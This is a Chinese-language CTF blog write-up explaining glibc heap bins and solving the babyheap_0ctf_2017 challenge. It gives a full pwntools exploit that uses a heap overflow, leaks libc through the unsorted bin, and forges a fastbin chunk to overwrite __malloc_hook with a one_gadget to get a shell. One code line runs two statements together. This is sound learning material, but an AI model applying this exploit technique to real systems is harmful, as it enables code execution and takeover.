# 【堆知识总结 _ bins结构】fastbins attack：babyheap_0ctf_2017

在堆漏洞这里面已经研究了差不多半个月了，虽然都还是很基础的知识，但是也差不多改收尾去看看别的部分的知识了，遇到不会的堆的题目（大概率会有）再来写堆题目的wp吧

想要或多或少总结一下堆chunk里面的一些漏洞，但我做的题也不多，所以能够写的也只有我理解的小小的一部分，并且有点想一出是一出。如果有看我博客的师傅的话请原谅一下哈哈哈。

# 堆的结构

## chunk的结构

首先是堆的结构，作为一个堆，它的结构我已经在之前的[博客](https://blog.csdn.net/ethan18/article/details/132197456)里面提到过，这里就不细说了。

## Bins

### bins的结构

bins是什么？在我的理解里面就是用来存储各种被free了的chunk，也就是一个缓冲区，当你要进行下一次的malloc或者是calloc时，直接会从Bins这个数组中来进行堆的获取

bins分为多种，但是用的多的也就几个（目前我知道的）：Fastbins、Unsorted bins、small bins、large bins这几种

以下我画了个差不多的结构图：

![https://img-blog.csdnimg.cn/15c531b5721b46adb53070b1cd443ca9.png](https://img-blog.csdnimg.cn/15c531b5721b46adb53070b1cd443ca9.png)

（这里修改一下：每个数组中的值都是一个链表结构） 这里还有一个从网上找到的图

![https://img-blog.csdnimg.cn/cdf25fe320ea433ab8254ca55af43ae1.png](https://img-blog.csdnimg.cn/cdf25fe320ea433ab8254ca55af43ae1.png)

Unsorted bins处于数组[0]和[1]，small bins处于数组[2]到数组[63]，以此类推。这些bins中的链表皆是双向链表。

而fastbins的结构在其他地方，不在这个bins数组中，并且时单向链表，也就是说**chunk中的bk指针没有用。**一般来说，fastbins中的chunk的最大差不多是在0x70~0x80这个范围（加上header之后）

同时，unsorted指针的初始位置和main_arena地址偏移量是恒定的，也就是说和libc_base的偏移量是恒定的，**可以根据这个来进行libc泄露**

### chunk如何进入small bins

chunk在从unsorted bins中，例如大小是0x100，如果此时系统malloc了一个大小0xf0的chunk，那么系统会将0x100的chunk进行切割，将0xf0进行分配，同时将0x10放进fastbins（如果被切割后剩下的比较大，那就被放进small bins这些里面）

# 堆漏洞： babyheap_0ctf_2017

堆漏洞我就不一一整理了，建议去看ctf-wiki，这里主要是回顾一道基础堆例题 

> fastbins attack： babyheap_0ctf_2017
> 

这道题在buuctf上也有，虽然是叫babyheap但是真的好难，感觉自己不知道啥时候才能独立做出来，希望后面可以

首先check一下

![https://img-blog.csdnimg.cn/6782b880a1114c17aa5afb64cff6a47e.png](https://img-blog.csdnimg.cn/6782b880a1114c17aa5afb64cff6a47e.png)

发现canary found，肯定不是栈溢出了 然后查看源代码

![https://img-blog.csdnimg.cn/d723cc1f2225430b85240161157eaa63.png](https://img-blog.csdnimg.cn/d723cc1f2225430b85240161157eaa63.png)

理清逻辑了，就是堆的经典套路，我们去看看fill

![https://img-blog.csdnimg.cn/670483078aec4c4683bae75ba88332f3.png](https://img-blog.csdnimg.cn/670483078aec4c4683bae75ba88332f3.png)

明显的堆溢出，直接进行fill就可以覆盖掉下一个chunk中的值，那我们也不需要考虑double free的问题了，直接堆溢出更方便

<aside>
💡 这些技巧的目的在我看来都是将复数的部分用来控制同一个chunk

</aside>

从我短暂的做题生涯中，对于做题来说无非就是： 

- libc泄露，找one_gadget_addr；用malloc_hook指针指向one_gadget_addr（这个gadget可以直接调用/bin/sh，one_gadget的安装教程在[这里](https://blog.csdn.net/yongbaoii/article/details/109101822))
- libc泄露，找system函数；知道scanf函数或者free的got表地址，把它改成system地址，相当于你输入后或者free后直接就调用system函数了（free的chunk里面内容是“/bin/sh”的话就会直接被认为是参数）

我们发现，没有system函数，肯定要搞libc泄露

![https://img-blog.csdnimg.cn/4c01387312694fd7aaff4fa773a775e4.png](https://img-blog.csdnimg.cn/4c01387312694fd7aaff4fa773a775e4.png)

从哪里泄露呢，我们想到，之前我讲过，unsorted bin地址和main_arena和libc的偏移都是固定的，那么可以把重点放在unsorted bins上

在我的感觉里，fastbin attack中double free主要是针对那种，两个地方指向一个chunk，然后free了一个chunk，另一个指针就可以获取到此时处于bins中的chunk的信息。

**比如说，unsorted bin的地址**

所以我们可以进行这样的操作： 将1、2号直接free，然后通过0号修改1号，修改bins中1号的fd地址是4号，再进行malloc，这样我们可以得到的就是这样：（图是别的师傅画的）

![https://img-blog.csdnimg.cn/88bc6d24d58349148e1e820368151da9.png](https://img-blog.csdnimg.cn/88bc6d24d58349148e1e820368151da9.png)

这样就可以实现我们的操作了，将4号free掉，可以进unsorted bins中，在通过2号的打印操作 这部分代码如下

```python
payload= b"a"*0x10 + p64(0)+p64(0x21)+ p8(0x80)
fill(0,len(payload),payload)

payload= b"a"*0x10 + p64(0)+p64(0x21)
fill(3,len(payload),payload)
allocate(0x10)
allocate(0x10)

payload= b"a"*0x10 + p64(0)+p64(0x91)
fill(3,len(payload),payload)
allocate(0x10)  # 防止和top chunk合并
myfree(4)

dump(2)
```

我们就可以知道unsorted bins 的地址了，也可以知道libc的地址了

```python
main_arena = unsortedbin_addr - 0x58libc_base = main_arena - 0x3c4b20
```

我们现在得到了关于libc的地址，接下来可以试着使用one_gadget和malloc_hook 

<aside>
💡 我在这道题才知道malloc_hook原来可以用在calloc上，惊了真的

</aside>

我们注意，此时我们能够修改的方式只有通过改chunk的值，所以在我们进行修改的时候我们必须从malloc_hook附近的一个地方开始将malloc_hook包含进来

![https://img-blog.csdnimg.cn/cf427a7b17f54c7c9817fdc0a1ea6fdc.png](https://img-blog.csdnimg.cn/cf427a7b17f54c7c9817fdc0a1ea6fdc.png)

我们可以试出，这个地址是和libc_base偏移恒定的，同时我们可以这样构造

![https://img-blog.csdnimg.cn/161e7f22f25047ae808a342162f74274.png](https://img-blog.csdnimg.cn/161e7f22f25047ae808a342162f74274.png)

可以看出这个0x7f，这是在fastbins的范围里面（甚至可以说是最大的值了）

malloc(0x60)，将4号free，顺便拆分，变成0x70大小的chunk，进入fastbins，然后通过2号仍旧存在的指针修改其fd为0x7f718b3c3aed，也就是假chunk的地址，这样就可以进行malloc_hook修改了

总体代码：

```python
from pwn import *
import warnings
from LibcSearcher import *

warnings.filterwarnings("ignore")
sh=process("./babyheap_0ctf_2017")
# sh = remote("node4.buuoj.cn","29436")

elf=ELF("./babyheap_0ctf_2017")
free_got=elf.got['free']

#context.log_level='debug'

def allocate(size):
    sh.recvuntil("Command: ")
    sh.sendline('1')
    sh.recvuntil("Size: ")
    sh.sendline(str(size))

def fill(idx, size, content):
    sh.recvuntil("Command: ")
    sh.sendline('2')
    sh.recvuntil("Index: ")
    sh.sendline(str(idx))
    sh.recvuntil("Size: ")
    sh.sendline(str(size))
    sh.recvuntil("Content: ")
    sh.sendline(content)

def myfree(idx):
    sh.recvuntil("Command: ")
    sh.sendline('3')
    sh.recvuntil("Index: ")
    sh.sendline(str(idx))

def dump(idx):
    sh.recvuntil("Command: ")
    sh.sendline('4')
    sh.recvuntil("Index: ")
    sh.sendline(str(idx))

allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x80)

myfree(2)
myfree(1)

payload= b"a"*0x10 + p64(0)+p64(0x21)+ p8(0x80)
fill(0,len(payload),payload)

payload= b"a"*0x10 + p64(0)+p64(0x21)
fill(3,len(payload),payload)

allocate(0x10)
allocate(0x10)

payload= b"a"*0x10 + p64(0)+p64(0x91)
fill(3,len(payload),payload)

allocate(0x10)  # 防止和top chunk合并
myfree(4)   

dump(2)

sh.recvuntil("Content: \n")
unsortedbin_addr = u64(sh.recv(8))
print(hex(unsortedbin_addr))

main_arena = unsortedbin_addr - 0x58
libc_base = main_arena - 0x3c4b20

allocate(0x60)
	
myfree(4)

fake_chunk_addr = main_arena - 0x33
payload = p64(fake_chunk_addr)

fill(2,len(payload),payload)

allocate(0x60)
allocate(0x60)

one_gadget_addr = libc_base + 0x4526a
payload = 0x13 * b'a' + p64(one_gadget_addr)
fill(6, len(payload), payload)

allocate(0x100)
sh.interactive()
```